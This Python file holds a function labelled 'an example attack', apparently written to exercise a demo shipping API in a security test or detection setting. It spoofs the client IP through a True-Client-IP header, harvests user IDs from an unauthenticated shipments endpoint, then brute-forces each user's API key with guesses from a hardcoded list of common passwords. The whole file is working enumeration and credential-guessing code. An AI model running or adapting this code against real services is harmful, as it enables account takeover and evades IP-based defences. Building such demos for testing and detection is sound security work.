import requests
import json
import random
from requests.auth import HTTPBasicAuth

# an example attack
def api_demo_auth_bruteforce_pivot(target, source_ip, user_agent, **kwargs):

    ret = ""

    # the uri we're going to request
    uri = '/api/v1/shipments'
    users_uri = '/api/v1/users/'

    # True-Client-IP needs to be set in order to spoof source ip.
    headers = {'User-Agent': user_agent,
               'True-Client-IP': str(source_ip)
              }

    # get a list of all shipments from unauth endpoint
    shipments_list = requests.get(target + uri, headers=headers).json()
    ret += "api_demo_auth_bruteforce_pivot: got {} shipments from {}\n".format(len(shipments_list),uri)
      
    # get a list of unique userids from unauth shipments endpoint
    userids = []
    for shipment in shipments_list:
        shipment_uri = target + uri + "/" + str(shipment)
        response = requests.get(shipment_uri, headers=headers).json()
        userid = (response[0])['userid']
        if userid not in userids:
            userids.append(userid)
            ret += "api_demo_auth_bruteforce_pivot: added userid {} from shipment {}\n".format(userid,shipment_uri)

    # finally, try to auth as each user
    passwords = [
                    'ponies',
                    'mysmallhorsefan4',
                    'mysmallhorsefan',
                    'mysmallhorse',
                    'smallhorsefan',
                    'ponies4lyfe',
                    'admin',
                    'demo',
                    'administrator',
                    'P@ssword',
                    'securedmz',
                    'secure',
                    '123456',
                    'passw0rd',
                    '00000',
                    '111111',
                    '123123',
                    '123321',
                    '1234',
                    '12345',
                    '1234567',
                    '12345678',
                    '123456789',
                    '1234567890',
                    '123abc',
                    '654321',
                    '666666',
                    '696969',
                    'aaaaaa',
                    'abc123',
                    'alberto',
                    'alejandra',
                    'alejandro',
                    'amanda',
                    'andrea',
                    'angel',
                    'angels',
                    'anthony',
                    'asdf',
                    'asdfasdf',
                    'ashley',
                    'babygirl',
                    'baseball',
                    'basketball',
                    'beatriz',
                    'blahblah',
                    'bubbles',
                    'buster',
                    'butterfly',
                    'zxcvbnm',
                    'zxczxc'
                ]

    # try to auth with a few guesses from pwlist for each userid
    for userid in userids:

        for i in range(15):
            password = random.choice(passwords)        
            user_uri = target + users_uri + str(userid)
            response = requests.get(user_uri, headers=headers, auth=("{}".format(password),"unused")).status_code
            ret += "api_demo_auth_bruteforce_pivot: got {} with {} and apikey: {}\n".format(response,user_uri,password)

    return(ret)

